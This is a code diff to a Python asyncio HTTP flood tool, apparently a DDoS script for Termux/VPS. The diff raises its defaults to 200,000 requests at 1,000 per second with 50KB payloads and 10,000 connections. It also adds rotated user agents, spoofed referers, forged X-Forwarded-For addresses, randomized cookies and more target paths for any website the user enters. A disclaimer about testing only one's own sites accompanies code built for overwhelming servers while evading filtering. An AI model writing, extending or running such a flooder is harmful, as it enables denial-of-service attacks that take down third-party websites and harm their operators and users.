@@ -6,8 +6,8 @@
 # It sends massive, varied HTTP requests to multiple websites, meant for authorized use only.
 # Unauthorized use is prohibited and illegal.
 #
-# Author: Sifat Mahmud (SM), version 5.1
-# Updates: Multi-website support, ultra-high concurrency, massive payloads, gorgeous UI.
+# Author: Sifat Mahmud (SM), version 5.2
+# Updates: Fixed URL prompt, ultra-high concurrency, massive payloads, gorgeous UI.
 # ----------------------------------------------------------------------------------------------
 
 import aiohttp
@@ -29,16 +29,16 @@ import ssl
 
 # Configuration
 CONFIG = {
-    'max_requests': 100000,    # Total requests (extreme)
-    'timeout': 900,            # Test duration (seconds)
-    'batch_size': 1000,        # Simultaneous requests
-    'request_rate': 500,       # Requests per second
-    'max_retries': 6,          # Retry attempts
+    'max_requests': 200000,    # Total requests (extreme)
+    'timeout': 1200,           # Test duration (seconds)
+    'batch_size': 1500,        # Simultaneous requests
+    'request_rate': 1000,      # Requests per second
+    'max_retries': 7,          # Retry attempts
     'request_types': ['GET', 'POST', 'HEAD', 'PUT'],
     'log_file': 'ddos_test.log',
     'target_urls': [],         # Filled dynamically
-    'payload_size': 20480,     # Max payload (20KB)
-    'connection_limit': 5000   # Max connections
+    'payload_size': 51200,     # Max payload (50KB)
+    'connection_limit': 10000  # Max connections
 }
 
 # Configure logging
@@ -78,7 +78,8 @@ def useragent_list():
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
     ]
     return headers_useragents
 
@@ -97,7 +98,9 @@ def referer_list():
         'https://www.instagram.com/',
         'https://www.youtube.com/',
         'https://www.pinterest.com/',
-        'https://www.tiktok.com/'
+        'https://www.tiktok.com/',
+        'https://www.amazon.com/',
+        'https://www.wikipedia.org/'
     ]
     return headers_referers
 
@@ -112,10 +115,10 @@ def check_resources():
         memory = psutil.virtual_memory()
         if cpu_usage > 95:
             logger.warning(f"High CPU usage: {cpu_usage}% - Reducing batch size")
-            CONFIG['batch_size'] = max(200, CONFIG['batch_size'] // 2)
+            CONFIG['batch_size'] = max(300, CONFIG['batch_size'] // 2)
         if memory.percent > 95:
             logger.warning(f"High memory usage: {memory.percent}% - Reducing batch size")
-            CONFIG['batch_size'] = max(200, CONFIG['batch_size'] // 2)
+            CONFIG['batch_size'] = max(300, CONFIG['batch_size'] // 2)
         return cpu_usage < 95 and memory.percent < 95
     except Exception as e:
         logger.error(f"Resource check failed: {e}")
@@ -125,7 +128,7 @@ async def httpcall(session, target_url, retry=0):
     """Send a varied HTTP request with randomized headers and payloads."""
     global request_counter, successful_requests, failed_requests, response_times, status_codes
     param_joiner = "&" if "?" in target_url else "?"
-    target_url = f"{target_url}{param_joiner}{buildblock(random.randint(5, 25))}={buildblock(random.randint(5, 25))}"
+    target_url = f"{target_url}{param_joiner}{buildblock(random.randint(5, 30))}={buildblock(random.randint(5, 30))}"
     headers = {
         'User-Agent': random.choice(headers_useragents),
         'Accept': random.choice([
@@ -139,30 +142,33 @@ async def httpcall(session, target_url, retry=0):
         'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 20)),
         'Connection': 'keep-alive',
         'Host': urlparse(target_url).netloc,
-        'Cookie': f'session={buildblock(20)}; user={buildblock(15)}; id={buildblock(10)}; token={buildblock(25)}',
+        'Cookie': f'session={buildblock(25)}; user={buildblock(20)}; id={buildblock(15)}; token={buildblock(30)}',
         'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
         'DNT': random.choice(['1', '0']),
         'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': random.choice(['document', 'image', 'script']),
+        'Sec-Fetch-Dest': random.choice(['document', 'image', 'script', 'font']),
         'Sec-Fetch-Mode': random.choice(['navigate', 'same-origin', 'no-cors']),
-        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site'])
+        'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site']),
+        'Sec-Fetch-User': '?1'
     }
     request_type = random.choice(CONFIG['request_types'])
     start_time = time.time()
     try:
+        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        ssl_context.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256')
         if request_type == 'POST':
-            data = {'data': buildblock(random.randint(5000, CONFIG['payload_size']))}
-            async with session.post(target_url, headers=headers, data=data, timeout=40, ssl=ssl.SSLContext()) as response:
+            data = {'data': buildblock(random.randint(10000, CONFIG['payload_size']))}
+            async with session.post(target_url, headers=headers, data=data, timeout=50, ssl=ssl_context) as response:
                 status = response.status
         elif request_type == 'PUT':
-            data = {'data': buildblock(random.randint(5000, CONFIG['payload_size']))}
-            async with session.put(target_url, headers=headers, data=data, timeout=40, ssl=ssl.SSLContext()) as response:
+            data = {'data': buildblock(random.randint(10000, CONFIG['payload_size']))}
+            async with session.put(target_url, headers=headers, data=data, timeout=50, ssl=ssl_context) as response:
                 status = response.status
         elif request_type == 'HEAD':
-            async with session.head(target_url, headers=headers, timeout=40, ssl=ssl.SSLContext()) as response:
+            async with session.head(target_url, headers=headers, timeout=50, ssl=ssl_context) as response:
                 status = response.status
         else:  # GET
-            async with session.get(target_url, headers=headers, timeout=40, ssl=ssl.SSLContext()) as response:
+            async with session.get(target_url, headers=headers, timeout=50, ssl=ssl_context) as response:
                 status = response.status
         response_time = time.time() - start_time
         response_times.append(response_time)
@@ -183,7 +189,7 @@ async def httpcall(session, target_url, retry=0):
         request_counter += 1
         if retry < CONFIG['max_retries']:
             logger.debug(f"Retrying request {request_counter} (Attempt {retry + 1}/{CONFIG['max_retries']})")
-            await asyncio.sleep(random.uniform(0.01, 0.2))
+            await asyncio.sleep(random.uniform(0.01, 0.3))
             return await httpcall(session, target_url, retry + 1)
         logger.error(f"Request {request_counter} failed after {CONFIG['max_retries']} retries")
         return None
@@ -205,6 +211,7 @@ async def run_attack():
         while request_counter < CONFIG['max_requests'] and (time.time() - start_time) < CONFIG['timeout']:
             if not check_resources():
                 logger.error("Resource limits reached. Adjusting batch size.")
+                print(colored("⚠ Resource limits reached. Adjusting batch size.", "yellow"))
             tasks = []
             remaining_requests = CONFIG['max_requests'] - request_counter
             current_batch_size = min(CONFIG['batch_size'], remaining_requests, CONFIG['request_rate'])
@@ -237,7 +244,7 @@ def welcome_message():
     ║   Author: Sifat Mahmud (SM)                        ║
     ║   For ETHICAL testing of YOUR OWN websites only!    ║
     ║   Unauthorized use is ILLEGAL and prohibited.       ║
-    ║   Version 5.1 - Optimized for Termux/VPS           ║
+    ║   Version 5.2 - Optimized for Termux/VPS           ║
     ║   Date: August 16, 2025                            ║
     ╚════════════════════════════════════════════════════╝
     """, "cyan"))
@@ -257,18 +264,19 @@ def get_user_input():
                 continue
         if not url.startswith(('http://', 'https://')):
             url = f'https://{url}'
-        urls.append(url)
+        if url not in urls:  # Avoid duplicates
+            urls.append(url)
     
     try:
-        max_requests = input(colored("🔢 Enter total number of requests (default 100000): ", "blue")).strip()
-        CONFIG['max_requests'] = int(max_requests) if max_requests else 100000
-        request_rate = input(colored("⚡ Enter requests per second (default 500): ", "blue")).strip()
-        CONFIG['request_rate'] = int(request_rate) if request_rate else 500
+        max_requests = input(colored("🔢 Enter total number of requests (default 200000): ", "blue")).strip()
+        CONFIG['max_requests'] = int(max_requests) if max_requests else 200000
+        request_rate = input(colored("⚡ Enter requests per second (default 1000): ", "blue")).strip()
+        CONFIG['request_rate'] = int(request_rate) if request_rate else 1000
     except ValueError:
         logger.error("Invalid input for max_requests or request_rate. Using defaults.")
-        print(colored("⚠ Invalid input. Using defaults: 100000 requests, 500 req/s.", "yellow"))
-        CONFIG['max_requests'] = 100000
-        CONFIG['request_rate'] = 500
+        print(colored("⚠ Invalid input. Using defaults: 200000 requests, 1000 req/s.", "yellow"))
+        CONFIG['max_requests'] = 200000
+        CONFIG['request_rate'] = 1000
     
     # Generate endpoints for each URL
     for url in urls:
@@ -308,7 +316,17 @@ def get_user_input():
             f'https://{host}/privacy.html',
             f'https://{host}/news/',
             f'https://{host}/events/',
-            f'https://{host}/support.html'
+            f'https://{host}/support.html',
+            f'https://{host}/account.html',
+            f'https://{host}/settings.html',
+            f'https://{host}/sitemap.xml',
+            f'https://{host}/robots.txt',
+            f'https://{host}/category/',
+            f'https://{host}/forum/',
+            f'https://{host}/gallery.html',
+            f'https://{host}/downloads/',
+            f'https://{host}/updates.html',
+            f'https://{host}/info.html'
         ]
         if url not in base_urls:
             base_urls.append(url)
